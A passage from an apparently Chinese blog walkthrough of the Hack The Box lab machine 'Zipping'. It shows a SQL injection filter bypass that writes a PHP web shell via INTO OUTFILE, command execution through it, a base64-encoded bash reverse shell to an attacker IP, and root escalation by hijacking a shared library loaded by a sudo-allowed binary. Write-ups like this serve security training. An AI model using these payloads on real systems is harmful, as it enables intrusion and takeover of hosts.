&lt;table&gt;</span><br><span class="line">            &lt;thead&gt;</span><br><span class="line">                &lt;tr&gt;</span><br><span class="line">                    &lt;td colspan=&quot;2&quot;&gt;Product&lt;/td&gt;</span><br><span class="line">                    &lt;td&gt;Price&lt;/td&gt;</span><br><span class="line">                    &lt;td&gt;Quantity&lt;/td&gt;</span><br><span class="line">                    &lt;td&gt;Total&lt;/td&gt;</span><br><span class="line">                &lt;/tr&gt;</span><br><span class="line">            &lt;/thead&gt;</span><br><span class="line">            &lt;tbody&gt;</span><br><span class="line">                &lt;?php if (empty($products)): ?&gt;</span><br><span class="line">                &lt;tr&gt;</span><br><span class="line">                    &lt;td colspan=&quot;5&quot; style=&quot;text-align:center;&quot;&gt;You have no products added in your Shopping Cart&lt;/td&gt;</span><br><span class="line">                &lt;/tr&gt;</span><br><span class="line">                &lt;?php else: ?&gt;</span><br><span class="line">                &lt;?php foreach ($products as $product): ?&gt;</span><br><span class="line">                &lt;tr&gt;</span><br><span class="line">                    &lt;td class=&quot;img&quot;&gt;</span><br><span class="line">                        &lt;a href=&quot;index.php?page=product&amp;id=&lt;?=$product[&#x27;id&#x27;]?&gt;&quot;&gt;</span><br><span class="line">                            &lt;img src=&quot;assets/imgs/&lt;?=$product[&#x27;img&#x27;]?&gt;&quot; width=&quot;50&quot; height=&quot;50&quot; alt=&quot;&lt;?=$product[&#x27;name&#x27;]?&gt;&quot;&gt;</span><br><span class="line">                        &lt;/a&gt;</span><br><span class="line">                    &lt;/td&gt;</span><br><span class="line">                    &lt;td&gt;</span><br><span class="line">                        &lt;a href=&quot;index.php?page=product&amp;id=&lt;?=$product[&#x27;id&#x27;]?&gt;&quot;&gt;&lt;?=$product[&#x27;name&#x27;]?&gt;&lt;/a&gt;</span><br><span class="line">                        &lt;br&gt;</span><br><span class="line">                        &lt;a href=&quot;index.php?page=cart&amp;remove=&lt;?=$product[&#x27;id&#x27;]?&gt;&quot; class=&quot;remove&quot;&gt;Remove&lt;/a&gt;</span><br><span class="line">                    &lt;/td&gt;</span><br><span class="line">                    &lt;td class=&quot;price&quot;&gt;&amp;dollar;&lt;?=$product[&#x27;price&#x27;]?&gt;&lt;/td&gt;</span><br><span class="line">                    &lt;td class=&quot;quantity&quot;&gt;</span><br><span class="line">                        &lt;input type=&quot;number&quot; name=&quot;quantity-&lt;?=$product[&#x27;id&#x27;]?&gt;&quot; value=&quot;&lt;?=$products_in_cart[$product[&#x27;id&#x27;]]?&gt;&quot; min=&quot;1&quot; max=&quot;&lt;?=$product[&#x27;quantity&#x27;]?&gt;&quot; placeholder=&quot;Quantity&quot; required&gt;</span><br><span class="line">                    &lt;/td&gt;</span><br><span class="line">                    &lt;td class=&quot;price&quot;&gt;&amp;dollar;&lt;?=$product[&#x27;price&#x27;] * $products_in_cart[$product[&#x27;id&#x27;]]?&gt;&lt;/td&gt;</span><br><span class="line">                &lt;/tr&gt;</span><br><span class="line">                &lt;?php endforeach; ?&gt;</span><br><span class="line">                &lt;?php endif; ?&gt;</span><br><span class="line">            &lt;/tbody&gt;</span><br><span class="line">        &lt;/table&gt;</span><br><span class="line">        &lt;div class=&quot;subtotal&quot;&gt;</span><br><span class="line">            &lt;span class=&quot;text&quot;&gt;Subtotal&lt;/span&gt;</span><br><span class="line">            &lt;span class=&quot;price&quot;&gt;&amp;dollar;&lt;?=$subtotal?&gt;&lt;/span&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;buttons&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; value=&quot;Update&quot; name=&quot;update&quot;&gt;</span><br><span class="line">            &lt;input type=&quot;submit&quot; value=&quot;Place Order&quot; name=&quot;placeorder&quot;&gt;</span><br><span class="line">	    &lt;input type=&quot;submit&quot; value=&quot;Clear&quot; name=&quot;clear&quot; onsubmit=&quot;&quot;&gt;</span><br><span class="line">        &lt;/div&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">&lt;?=template_footer()?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p></p><h4 id="代码审计"><a class="anchor" href="#代码审计">#</a> 代码审计</h4><p>通过观察代码可以得知</p><p>product.php 代码中执行 sql 语句时使用了</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$stmt = $pdo-&gt;prepare(&quot;SELECT * FROM products WHERE id = &#x27;$id&#x27;&quot;);</span><br></pre></td></tr></table></figure><p></p><p>将代码预编译了 sql 语句</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SQL预编译是指在执行SQL语句之前，将参数送到数据库预编译，编译完成后，将验证后的SQL语句发送到数据库进行执行。 这种方法可以有效地防止SQL注入攻击，因为攻击者不能通过注入代码来修改或者干扰SQL预编译中的语句。</span><br></pre></td></tr></table></figure><p></p><p>而 cart.php 中是直接写入的 sql 语法</p><p>所以能导致 sql 注入</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;SELECT * FROM products WHERE id = &#x27;&quot; . $_POST[&#x27;product_id&#x27;] . &quot;&#x27;&quot;;</span><br><span class="line">$product = $pdo-&gt;query($sql)-&gt;fetch(PDO::FETCH_ASSOC);</span><br></pre></td></tr></table></figure><p></p><p>但是它的前面使用了不少过滤</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\-_=+&#123;&#125;\[\]\\|;:&#x27;\&quot;,.&lt;&gt;\/?]|[^0-9]$/&quot;, $product_id, $match) || preg_match(&quot;/^.*[A-Za-z!#$%^&amp;*()\-_=+&#123;&#125;[\]\\|;:&#x27;\&quot;,.&lt;&gt;\/?]/i&quot;, $quantity, $match)) &#123;</span><br><span class="line"></span><br><span class="line">^.*[A-Za-z!#$%^&amp;*()\-_=+&#123;&#125;\[\]\\|;:&#x27;\&quot;,.&lt;&gt;\/?]|[^0-9]$</span><br><span class="line">这个正则的话前面的^.*可以使用%0a绕过</span><br><span class="line">然后后面的$只是匹配个数字而已后面直接加上</span><br></pre></td></tr></table></figure><p></p><p>先构造好思路，首先利用</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shop/index.php?page=</span><br></pre></td></tr></table></figure><p></p><p>能达到文件任意读取，</p><p>在通过 shop/cart.php 来进行上传马儿</p><h4 id="反弹shell"><a class="anchor" href="#反弹shell">#</a> 反弹 shell</h4><p>经过测试发现都不能写入木马，最后看别人 wp 用 into outfile 写到 /var/lib/mysql 里面去就行了</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /shop/index.php?page=cart HTTP/1.1</span><br><span class="line"> </span><br><span class="line">Host: 10.10.11.229</span><br><span class="line"> </span><br><span class="line">Content-Length: 113</span><br><span class="line"> </span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line"> </span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"> </span><br><span class="line">Origin: http://10.10.11.229</span><br><span class="line"> </span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"> </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36</span><br><span class="line"> </span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"> </span><br><span class="line">Referer: http://10.10.11.229/shop/index.php?page=cart</span><br><span class="line"> </span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line"> </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"> </span><br><span class="line">Cookie: PHPSESSID=2r2p0aicavvo4ka7ncc5ce1i0a</span><br><span class="line"> </span><br><span class="line">Connection: close</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">quantity=1&amp;product_id=%0a&#x27;%3bselect+&#x27;&lt;%3fphp+system(&quot;$_POST[1]&quot;)%3b%3f&gt;&#x27;+into+outfile+&#x27;/var/lib/mysql/7.php&#x27;;+--2</span><br></pre></td></tr></table></figure><p></p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /shop/index.php?page=/var/lib/mysql/7 HTTP/1.1</span><br><span class="line">Host: 10.10.11.229</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=hngopd6tchq7vfp0pfndmd7oq3</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 4</span><br><span class="line"></span><br><span class="line">1=ls</span><br></pre></td></tr></table></figure><p></p><p>命令执行成功</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Fri, 15 Dec 2023 06:40:57 GMT</span><br><span class="line">Server: Apache/2.4.54 (Ubuntu)</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Vary: Accept-Encoding</span><br><span class="line">Content-Length: 89</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">assets</span><br><span class="line">cart.php</span><br><span class="line">functions.php</span><br><span class="line">home.php</span><br><span class="line">index.php</span><br><span class="line">placeorder.php</span><br><span class="line">product.php</span><br><span class="line">products.php</span><br></pre></td></tr></table></figure><p></p><p>接下来反弹一下 shell</p><p>使用加密后的 bash 反弹一下试试</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ echo bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.10.14.54/9999 0&gt;&amp;1&quot;|base64</span><br><span class="line">YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjU0Lzk5OTkgMD4mMQo=</span><br></pre></td></tr></table></figure><p></p><p>使用</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /shop/index.php?page=/var/lib/mysql/7 HTTP/1.1</span><br><span class="line">Host: 10.10.11.229</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=hngopd6tchq7vfp0pfndmd7oq3</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 90</span><br><span class="line"></span><br><span class="line">1=echo YmFzaCAtYyBiYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjU0Lzk5OTkgMD4mMQo=|base64 -d|bash</span><br></pre></td></tr></table></figure><p></p><p>得到 shell</p><p>虽然是 1001 但是目录下有 user.txt</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=1001(rektsu) gid=1001(rektsu) groups=1001(rektsu)</span><br></pre></td></tr></table></figure><p></p><h4 id="提权"><a class="anchor" href="#提权">#</a> 提权</h4><p>执行 sudo -l</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for rektsu on zipping:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User rektsu may run the following commands on zipping:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/stock</span><br></pre></td></tr></table></figure><p></p><p>使用 ltrace -Ss 10000 ./stock</p><p>这个 stock 的调用库竟然使用了 rektsu/.config/libcounter.so 意义很明显了，</p><p>我们直接在.config 下面写一个一样名称的动态链接库</p><p>只要这个动态链接库执行一下 /usr/bin/bash -i 就相当于提权脚本一样</p><p>先写一个 c</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"> </span><br><span class="line">void __attribute__((constructor)) init() &#123;</span><br><span class="line">    system(&quot;/usr/bin/bash -i&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p>在使用</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -c –fPIC –shared –o /home/rektsu/.config/libcounter.so *.c</span><br></pre></td></tr></table></figure><p></p><p>即可提权成功</p><div class="tags"><a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"><i class="ic i-tag"></i> 渗透</a></div></div><footer><div class="meta"><span class="item"><span class="icon"><i class="ic i-calendar-check"></i> </span><span class="text">更新于</span> <time title="修改时间：2023-12-15 15:25:52" itemprop="dateModified" datetime="2023-12-15T15:25:52+08:00">2023-12-15</time> </span><span id="HTB-Zipping/" class="item leancloud_visitors" data-flag-title="HTB-Zipping" title="阅读次数"><span class="icon"><i class="ic i-eye"></i> </span><span class="text">阅读次数</span> <span class="leancloud-visitors-count"></span> <span class="text">次</span></span></div><div class="reward"><button><i class="ic i-heartbeat"></i> 赞赏</button><p>请我喝[茶]~(￣▽￣)~*</p><div id="qr"><div><img data-src="/images/wechatpay.png" alt="c0iq 微信支付"><p>微信支付</p></div><div><img data-src="/images/alipay.png" alt="c0iq 支付宝"><p>支付宝</p></div></div></div><div id="copyright"><ul><li class="author"><strong>本文作者： </strong>c0iq <i class="ic i-at"><em>@</em></i>ililiiY</li><li class="link"><strong>本文链接：</strong> <a href="https://lookhui.github.io/HTB-Zipping/" title="HTB-Zipping">https://lookhui.github.io/HTB-Zipping/</a></li><li class="license"><strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！</li></ul></div></footer></article></div><div class="post-nav"><div class="item left"><a href="/HTB-Devvortex/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?390497" title="HTB-Devvortex"><span class="type">上一篇</span> <span class="category"><i class="ic i-flag"></i> HTB</span><h3>HTB-Devvortex</h3></a></div><div class="item right"><a href="/HTB-Saturn/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;www.loliapi.com&#x2F;acg&#x2F;?505519" title="HTB-Saturn"><span class="type">下一篇</span> <span class="category"><i class="ic i-flag"></i> HTB</span><h3>HTB-Saturn</h3></a></div></div><div class="wrap" id="comments"></div></div><div id="sidebar"><div class="inner"><div class="panels"><div class="inner"><div class="contents panel pjax" data-title="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#zipping"><span class="toc-number">1.</span> <span class="toc-text">Zipping</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">代码审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">1.0.0.3.</span> <span class="toc-text">反弹 shell</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">1.0.0.4.</span> <span class="toc-text">提权</span></a></li></ol></li></ol></div><div class="related panel pjax" data-title="系列文章"><ul><li><a href="/HTB-WEB-md/" rel="bookmark" title="HTB-WEB">HTB-WEB</a></li><li><a href="/HTB-hunting-md/" rel="bookmark" title="HTB-hunting">HTB-hunting</a></li><li><a href="/HTB-racecar-md/" rel="bookmark" title="HTB-racecar">HTB-racecar</a></li><li><a href="/HTB-You-know-0xDiablos-md/" rel="bookmark" title="HTB-You_know_0xDiablos">HTB-You_know_0xDiablos</a></li><li><a href="/HTB-Sick-ROP/" rel="bookmark" title="HTB-Sick_ROP">HTB-Sick_ROP</a></li><li><a href="/HTB-CozyHosting/" rel="bookmark" title="HTB-CozyHosting">HTB-CozyHosting</a></li><li><a href="/HTB-Sau/" rel="bookmark" title="HTB-Sau">HTB-Sau</a></li><li><a href="/HTB-Keeper/" rel="bookmark" title="HTB-Keeper">HTB-Keeper</a></li><li><a href="/HTB-Analytics/" rel="bookmark" title="HTB-Analytics">HTB-Analytics</a></li><li><a href="/HTB-Codify/" rel="bookmark" title="HTB-Codify">HTB-Codify</a></li><li><a href="/HTB-Devvortex/" rel="bookmark" title="HTB-Devvortex">HTB-Devvortex</a></li><li class="active"><a href="/HTB-Zipping/" rel="bookmark" title="HTB-Zipping">HTB-Zipping</a></li><li><a href="/HTB-Saturn/" rel="bookmark" title="HTB-Saturn">HTB-Saturn</a></li><li><a href="/HTB-TwoDots-Horror/" rel="bookmark" title="HTB-TwoDots_Horror">HTB-TwoDots_Horror</a></li><li><a href="/HTB-Restauran/" rel="bookmark" title="HTB-Restauran">HTB-Restauran</a></li></ul></div><div class="overview panel" data-title="站点概览"><div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person"><img class="image" itemprop="image" alt="c0iq" data-src="/images/avatar.jpg"><p class="name" itemprop="name">c0iq</p><div class="description" itemprop="description">坚持与努力</div></div><nav class="state"><div class="item posts"><a href="/archives/"><span class="count">28</span> <span class="name">文章</span></a></div><div class="item categories"><a href="/categories/"><span class="count">7</span> <span class="name">分类</span></a></div><div class="item tags"><a href="/tags/"><span class="count">10</span> <span class="name">标签</span></a></div></nav><div class="social"><span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2xvb2todWk=" title="https:&#x2F;&#x2F;github.com&#x2F;lookhui"><i class="ic i-github"></i></span></div><ul class="menu"><li class="item"><a href="/" rel="section"><i class="ic i-home"></i>首页</a></li><li class="item"><a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a></li><li class="item"><a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a></li><li class="item"><a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a></li></ul><li class="item"><a href="/links/" rel="section"><i class="ic i-magic"></i>友链</a></li></div></div></div><ul id="quick"><li class="prev pjax"><a href="/HTB-Devvortex/" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a></li><li class="up"><i class="ic i-arrow-up"></i></li><li class="down"><i class="ic i-arrow-down"></i></li><li class="next pjax"><a href="/HTB-Saturn/" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a></li><li class="percent"></li></ul></div></div><div class="dimmer"></div></div></main><footer id="footer"><div class="inner"><div class="widgets"><div class="rpost pjax"><h2>随机文章</h2><ul><li class="item"><div class="breadcrumb"><a href="/categories/%E6%AF%94%E8%B5%9B/" title="分类于 比赛">比赛</a></div><span><a href="/%E7%AC%AC%E4%B8%83%E5%B1%8A%E5%BC%BA%E7%BD%91%E6%9D%AFwp/" title="第七届强网杯wp">第七届强网杯wp</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a></div><span><a href="/%E5%B7%B4%E6%B8%9D%E6%9D%AF%E5%88%9D%E8%B5%9Bwp/" title="巴渝杯初赛wp">巴渝杯初赛wp</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/HTB/" title="分类于 HTB">HTB</a></div><span><a href="/HTB-You-know-0xDiablos-md/" title="HTB-You_know_0xDiablos">HTB-You_know_0xDiablos</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/HTB/" title="分类于 HTB">HTB</a></div><span><a href="/HTB-racecar-md/" title="HTB-racecar">HTB-racecar</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/HTB/" title="分类于 HTB">HTB</a></div><span><a href="/HTB-CozyHosting/" title="HTB-CozyHosting">HTB-CozyHosting</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/%E8%B0%88%E8%B0%88%E6%88%91%E5%AF%B9%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E4%B8%8E%E8%AF%84%E4%BC%B0%E8%B5%9B%E9%A1%B9%E7%9A%84%E7%9C%8B%E6%B3%95/" title="2024开始的打击">2024开始的打击</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF/" title="分类于 CTF">CTF</a></div><span><a href="/%E5%B8%95%E9%B2%81%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" title="帕鲁杯">帕鲁杯</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/CTF%E5%88%B7%E9%A2%98/" title="分类于 CTF刷题">CTF刷题</a></div><span><a href="/REVERSE%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" title="REVERSE刷题记录">REVERSE刷题记录</a></span></li><li class="item"><div class="breadcrumb"><a href="/categories/HTB/" title="分类于 HTB">HTB</a></div><span><a href="/HTB-Keeper/" title="HTB-Keeper">HTB-Keeper</a></span></li><li class="item"><div class="breadcrumb"></div><span><a href="/NKCTF%202024/" title="NKCTF">NKCTF</a></span></li></ul></div><div><h2>最新评论</h2><ul class="leancloud-recent-comment"></ul></div></div><div class="status"><div class="copyright">&copy; 2010 – <span itemprop="copyrightYear">2024</span> <span class="with-love"><i class="ic i-sakura rotate"></i> </span><span class="author" itemprop="copyrightHolder">c0iq @ look-hui</span></div><div class="count"><span class="post-meta-item-icon"><i class="ic i-chart-area"></i> </span><span title="站点总字数">240k 字</span> <span class="post-meta-divider">|</span> <span class="post-meta-item-icon"><i class="ic i-coffee"></i> </span><span title="站点阅读时长">3:39</span></div><div class="powered-by">基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span></div></div></div></footer></div><script data-config type="text/javascript">var LOCAL={path:"HTB-Zipping/",favicon:{show:"looklook",hide:"illi"},search:{placeholder:"文章搜索",empty:"关于 「 ${query} 」，什么也没搜到",stats:"${time} ms 内找到 ${hits} 条结果"},valine:!0,fancybox:!0,copyright:'复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',ignores:[function(i){return i.includes("#")},function(i){return new RegExp(LOCAL.path+"$").test(i)}]}</script><script src="https://cdn.polyfill.io/v2/polyfill.js"></script><script src="//cdn.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script><script src="/js/app.js?v=0.2.5"></script></body></html><!-- rebuild by hrmmi -->